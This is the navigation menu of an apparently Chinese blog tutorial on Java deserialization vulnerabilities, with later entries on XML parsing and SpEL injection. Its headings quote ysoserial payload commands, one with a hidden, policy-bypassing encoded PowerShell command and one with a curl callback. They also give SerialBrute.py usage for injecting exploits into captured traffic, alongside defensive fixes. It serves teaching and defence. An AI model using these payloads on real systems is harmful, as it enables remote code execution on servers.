class="nav-number">1.15.8.</span> <span class="nav-text">③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#④-若包含危险库，则使用ysoserial进行攻击复现。"><span class="nav-number">1.15.9.</span> <span class="nav-text">④ 若包含危险库，则使用ysoserial进行攻击复现。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#黑盒检测"><span class="nav-number">1.16.</span> <span class="nav-text">黑盒检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache-Commons-Collection）的调用地点，并进行数据替换，从而实现利用。"><span class="nav-number">1.16.1.</span> <span class="nav-text">在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。"><span class="nav-number">1.16.2.</span> <span class="nav-text">在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化数据通常以AC-ED开始，之后的两个字节是版本号，版本号一般是00-05但在某些情况下可能是更高的数字。"><span class="nav-number">1.16.3.</span> <span class="nav-text">序列化数据通常以AC ED开始，之后的两个字节是版本号，版本号一般是00 05但在某些情况下可能是更高的数字。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以通过xxd-winhex等工具看序列化后的文件。"><span class="nav-number">1.16.4.</span> <span class="nav-text">我们可以通过xxd,winhex等工具看序列化后的文件。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#需要注意的是，AC-ED-00-05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。"><span class="nav-number">1.16.5.</span> <span class="nav-text">需要注意的是，AC ED 00 05是常见的序列化数据开始，但有些应用程序在整个运行周期中保持与服务器的网络连接，如果攻击载荷是在延迟中发送的，那检测这四个字节就是无效的。所以有些防火墙工具在检测反序列化数据时仅仅检测这几个字节是不安全的设置。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现-，以’-’结尾-，并使用正斜杠来分隔命名空间和类名（例如-“Ljava-rmi-dgc-VMID-”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如-：表示对象（TC-OBJECT），后跟其类描述（TC-CLASSDESC）的’sr’或-可能表示没有超类（TC-NULL）的类的类注释（TC-ENDBLOCKDATA）的’xp’。"><span class="nav-number">1.16.6.</span> <span class="nav-text">所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表："><span class="nav-number">1.16.7.</span> <span class="nav-text">识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#AC-ED-00-05之后可能跟上述的数据类型说明符，也可能跟77-TC-BLOCKDATA元素-或7A-TC-BLOCKDATALONG元素-其后跟的是块数据。"><span class="nav-number">1.16.8.</span> <span class="nav-text">AC ED 00 05之后可能跟上述的数据类型说明符，也可能跟77(TC_BLOCKDATA元素)或7A(TC_BLOCKDATALONG元素)其后跟的是块数据。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper"><span class="nav-number">1.16.9.</span> <span class="nav-text">序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用法："><span class="nav-number">1.16.10.</span> <span class="nav-text">用法：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#java-jar-SerializationDumper-v1-0-jar-aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2"><span class="nav-number">1.16.11.</span> <span class="nav-text">java -jar SerializationDumper-v1.0.jar aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#后面跟的十六进制字符串即为序列化后的数据"><span class="nav-number">1.16.12.</span> <span class="nav-text">后面跟的十六进制字符串即为序列化后的数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#工具自动解析出包含的数据类型之后，就可以替换掉TC-BLOCKDATE进行替换了。AC-ED-00-05经过Base64编码之后为rO0AB"><span class="nav-number">1.16.13.</span> <span class="nav-text">工具自动解析出包含的数据类型之后，就可以替换掉TC_BLOCKDATE进行替换了。AC ED 00 05经过Base64编码之后为rO0AB</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在实战过程中，我们可以通过tcpdump抓取TCP-HTTP请求，通过SerialBrute-py去自动化检测，并插入ysoserial生成的exp"><span class="nav-number">1.16.14.</span> <span class="nav-text">在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过SerialBrute.py去自动化检测，并插入ysoserial生成的exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SerialBrute-py-r-lt-file-gt-c-lt-command-gt-opts"><span class="nav-number">1.16.15.</span> <span class="nav-text">SerialBrute.py -r &lt;file&gt; -c &lt;command&gt; [opts]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SerialBrute-py-p-lt-file-gt-t-lt-host-port-gt-c-lt-command-gt-opts"><span class="nav-number">1.16.16.</span> <span class="nav-text">SerialBrute.py -p &lt;file&gt; -t &lt;host:port&gt; -c &lt;command&gt; [opts]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用ysoserial-jar访问请求记录判断反序列化漏洞是否利用成功："><span class="nav-number">1.16.17.</span> <span class="nav-text">使用ysoserial.jar访问请求记录判断反序列化漏洞是否利用成功：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#java-jar-ysoserial-jar-CommonsCollections1-39-curl-quot-URL-quot-39"><span class="nav-number">1.16.18.</span> <span class="nav-text">java -jar ysoserial.jar CommonsCollections1 &#39;curl &quot; + URL + &quot; &#39;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。"><span class="nav-number">1.16.19.</span> <span class="nav-text">当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境测试"><span class="nav-number">1.17.</span> <span class="nav-text">环境测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在这里，我们使用大牛写好的DeserLab来模拟实战环境。"><span class="nav-number">1.17.1.</span> <span class="nav-text">在这里，我们使用大牛写好的DeserLab来模拟实战环境。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DeserLab演示"><span class="nav-number">1.17.2.</span> <span class="nav-text">DeserLab演示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache-Commons-Collection库一样，含有可利用的POP链。"><span class="nav-number">1.17.3.</span> <span class="nav-text">DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache Commons Collection库一样，含有可利用的POP链。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。"><span class="nav-number">1.17.4.</span> <span class="nav-text">我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#复现环境："><span class="nav-number">1.17.5.</span> <span class="nav-text">复现环境：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-win10"><span class="nav-number">1.17.5.1.</span> <span class="nav-text">1.win10</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-python2-7"><span class="nav-number">1.17.5.2.</span> <span class="nav-text">2.python2.7</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-java1-8"><span class="nav-number">1.17.5.3.</span> <span class="nav-text">3.java1.8</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#首先生成有效载荷-由于是在windows环境下，所以使用powershell作为攻击载体。"><span class="nav-number">1.17.6.</span> <span class="nav-text">首先生成有效载荷,由于是在windows环境下，所以使用powershell作为攻击载体。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用ysoserial生成针对Groovy库的payload"><span class="nav-number">1.17.7.</span> <span class="nav-text">用ysoserial生成针对Groovy库的payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#java-jar-ysoserial-jar-Groovy1-quot-powershell-exe-NonI-W-Hidden-NoP-Exec-Bypass-Enc-bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA-MAByAHMAZQA-quot-gt-payload2-bin"><span class="nav-number">1.17.8.</span> <span class="nav-text">java -jar ysoserial.jar Groovy1 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA MAByAHMAZQA=&quot; &gt; payload2.bin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在DeserLab的Github项目页面下载DeserLab-jar"><span class="nav-number">1.17.9.</span> <span class="nav-text">在DeserLab的Github项目页面下载DeserLab.jar</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#命令行下使用java-jar-DeserLab-jar-server-127-0-0-1-6666开启本地服务端。"><span class="nav-number">1.17.10.</span> <span class="nav-text">命令行下使用java -jar DeserLab.jar -server 127.0.0.1 6666开启本地服务端。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用deserlab-exploit-py脚本【上传到自己的github-gist页面上】生成payload："><span class="nav-number">1.17.11.</span> <span class="nav-text">使用deserlab_exploit.py脚本【上传到自己的github gist页面上】生成payload：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PS-注意使用py2-7"><span class="nav-number">1.17.12.</span> <span class="nav-text">PS:注意使用py2.7</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#成功写入："><span class="nav-number">1.17.13.</span> <span class="nav-text">成功写入：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#即可执行任意命令"><span class="nav-number">1.17.14.</span> <span class="nav-text">即可执行任意命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化修复"><span class="nav-number">1.18.</span> <span class="nav-text">反序列化修复</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。"><span class="nav-number">1.18.1.</span> <span class="nav-text">每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对于危险基础类的调用。"><span class="nav-number">1.18.2.</span> <span class="nav-text">对于危险基础类的调用。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过Hook-resolveClass来校验反序列化的类"><span class="nav-number">1.19.</span> <span class="nav-text">通过Hook resolveClass来校验反序列化的类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在使用readObject-反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下"><span class="nav-number">1.19.1.</span> <span class="nav-text">在使用readObject()反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。"><span class="nav-number">1.19.2.</span> <span class="nav-text">通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#根据以上方法，有大牛实现了线程的SerialKiller包可供使用。"><span class="nav-number">1.19.3.</span> <span class="nav-text">根据以上方法，有大牛实现了线程的SerialKiller包可供使用。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用ValidatingObjectInputStream来校验反序列化的类"><span class="nav-number">1.20.</span> <span class="nav-text">使用ValidatingObjectInputStream来校验反序列化的类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Apache-Commons-IO-Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白-黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下"><span class="nav-number">1.20.1.</span> <span class="nav-text">使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用contrast-rO0防御反序列化攻击"><span class="nav-number">1.21.</span> <span class="nav-text">使用contrast-rO0防御反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白-黑名单控制，示例代码如下"><span class="nav-number">1.21.1.</span> <span class="nav-text">contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白/黑名单控制，示例代码如下:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用ObjectInputFilter来校验反序列化的类"><span class="nav-number">1.22.</span> <span class="nav-text">使用ObjectInputFilter来校验反序列化的类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Java-9包含了支持序列化数据过滤的新特性，开发人员也可以继承java-io-ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白-黑名单控制。示例代码如下"><span class="nav-number">1.22.1.</span> <span class="nav-text">Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。示例代码如下:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上述示例代码，仅允许反序列化SerialObject类对象。"><span class="nav-number">1.22.2.</span> <span class="nav-text">上述示例代码，仅允许反序列化SerialObject类对象。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁止JVM执行外部命令Runtime-exec"><span class="nav-number">1.23.</span> <span class="nav-text">禁止JVM执行外部命令Runtime.exec</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过扩展SecurityManager"><span class="nav-number">1.23.1.</span> <span class="nav-text">通过扩展SecurityManager</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不建议使用的黑名单"><span class="nav-number">1.24.</span> <span class="nav-text">不建议使用的黑名单</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。"><span class="nav-number">1.24.1.</span> <span class="nav-text">在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.25.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。"><span class="nav-number">1.25.1.</span> <span class="nav-text">感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。"><span class="nav-number">1.25.2.</span> <span class="nav-text">代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。"><span class="nav-number">1.25.3.</span> <span class="nav-text">这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#防御部分的代码不是我自己写的，而且有些是参考人家的。"><span class="nav-number">1.25.4.</span> <span class="nav-text">防御部分的代码不是我自己写的，而且有些是参考人家的。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接："><span class="nav-number">1.26.</span> <span class="nav-text">参考链接：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化原理—http-www-hollischuang-com-archives-1140"><span class="nav-number">1.26.1.</span> <span class="nav-text">反序列化原理—http://www.hollischuang.com/archives/1140</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#深入理解JAVA反序列化漏洞—https-paper-seebug-org-312"><span class="nav-number">1.26.2.</span> <span class="nav-text">深入理解JAVA反序列化漏洞—https://paper.seebug.org/312/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Attacking-Java-Deserialization—-https-nickbloor-co-uk-2017-08-13-attacking-java-deserialization"><span class="nav-number">1.26.3.</span> <span class="nav-text">Attacking Java Deserialization— https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#java反序列化工具ysoserial分析—http-drops-xmd5-com-static-drops-papers-14317-html"><span class="nav-number">1.26.4.</span> <span class="nav-text">java反序列化工具ysoserial分析—http://drops.xmd5.com/static/drops/papers-14317.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JAVA反序列化漏洞之殇（防御部分代码作者）—https-github-com-Cryin-Paper-blob-master-E5-BA-94-E7-94-A8-E5-AE-89-E5-85-A8-JAVA-E5-8F-8D-E5-BA-8F-E5-88-97-E5-8C-96-E6-BC-8F-E6-B4-9E-E4-B9-8B-E6-AE-87-md"><span class="nav-number">1.26.5.</span> <span class="nav-text">JAVA反序列化漏洞之殇（防御部分代码作者）—https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#breenmachine师傅的分析—https-foxglovesecurity-com-2015-11-06-what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability"><span class="nav-number">1.26.6.</span> <span class="nav-text">breenmachine师傅的分析—https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Lib之过？Java反序列化漏洞通用利用分析—https-blog-chaitin-cn-2015-11-11-java-unserialize-rce"><span class="nav-number">1.26.7.</span> <span class="nav-text">Lib之过？Java反序列化漏洞通用利用分析—https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java操作xml的几种方式"><span class="nav-number">1.27.</span> <span class="nav-text">java操作xml的几种方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们要解析的xml格式如下："><span class="nav-number">1.27.1.</span> <span class="nav-text">我们要解析的xml格式如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#我们可以看到xml的存储结构就是传统的树状结构。"><span class="nav-number">1.28.</span> <span class="nav-text">我们可以看到xml的存储结构就是传统的树状结构。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们之所以要用xml是由于跨平台传输。"><span class="nav-number">1.28.1.</span> <span class="nav-text">我们之所以要用xml是由于跨平台传输。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下面我们开始解析xml为了xxe做铺垫。"><span class="nav-number">1.29.</span> <span class="nav-text">下面我们开始解析xml为了xxe做铺垫。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-应用DOM方式解析XML"><span class="nav-number">1.29.1.</span> <span class="nav-text">0x1 应用DOM方式解析XML</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直接运行一下明显的看到解析出所有的节点。"><span class="nav-number">1.29.2.</span> <span class="nav-text">直接运行一下明显的看到解析出所有的节点。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM解析会将整个xml文件加载到内存中吗，然后逐个解析"><span class="nav-number">1.30.</span> <span class="nav-text">DOM解析会将整个xml文件加载到内存中吗，然后逐个解析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Sax解析是通过handler处理类逐个进行解析每个节点"><span class="nav-number">1.30.1.</span> <span class="nav-text">Sax解析是通过handler处理类逐个进行解析每个节点</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。-SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。"><span class="nav-number">1.30.1.1.</span> <span class="nav-text">在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。 SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码示例Book实体类"><span class="nav-number">1.31.</span> <span class="nav-text">代码示例Book实体类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#books-xml文件"><span class="nav-number">1.32.</span> <span class="nav-text">books.xml文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试的主类："><span class="nav-number">1.33.</span> <span class="nav-text">测试的主类：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM4J-是第三方提供的解析XML方法，需要dom4j-1-6-1-jar包"><span class="nav-number">1.34.</span> <span class="nav-text">DOM4J 是第三方提供的解析XML方法，需要dom4j-1.6.1.jar包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML四种解析方式性能测试："><span class="nav-number">1.35.</span> <span class="nav-text">XML四种解析方式性能测试：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SAX-gt-DOM-gt-DOM4J-gt-JDOM"><span class="nav-number">1.35.1.</span> <span class="nav-text">SAX&gt;DOM&gt;DOM4J&gt;JDOM</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main-入口进行测试。"><span class="nav-number">1.35.2.</span> <span class="nav-text">JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main()入口进行测试。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM4J在灵活性和对复杂xml的支持上都要强于DOM"><span class="nav-number">1.35.3.</span> <span class="nav-text">DOM4J在灵活性和对复杂xml的支持上都要强于DOM</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。"><span class="nav-number">1.35.4.</span> <span class="nav-text">DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。"><span class="nav-number">1.35.5.</span> <span class="nav-text">DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当XML文件比较大的时候，会发现DOM4J比较好用"><span class="nav-number">1.35.6.</span> <span class="nav-text">当XML文件比较大的时候，会发现DOM4J比较好用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#多使用dom4j"><span class="nav-number">1.35.7.</span> <span class="nav-text">多使用dom4j</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四个遇到在好好研究了。"><span class="nav-number">1.36.</span> <span class="nav-text">第四个遇到在好好研究了。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SpEL表达式注入"><span class="nav-number">1.37.</span> <span class="nav-text">SpEL表达式注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SpEL简介"><span class="nav-number">1.38.</span> <span class="nav-text">SpEL简介</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Spring-Expression-Language是一种强大的表达式语言-Spring开发中经常会用到。正是因为功能强大-导致在某些情况下-用户可从外部注入SpEl表达式-导致命令执行。"><span class="nav-number">1.38.0.1.</span> <span class="nav-text">Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" 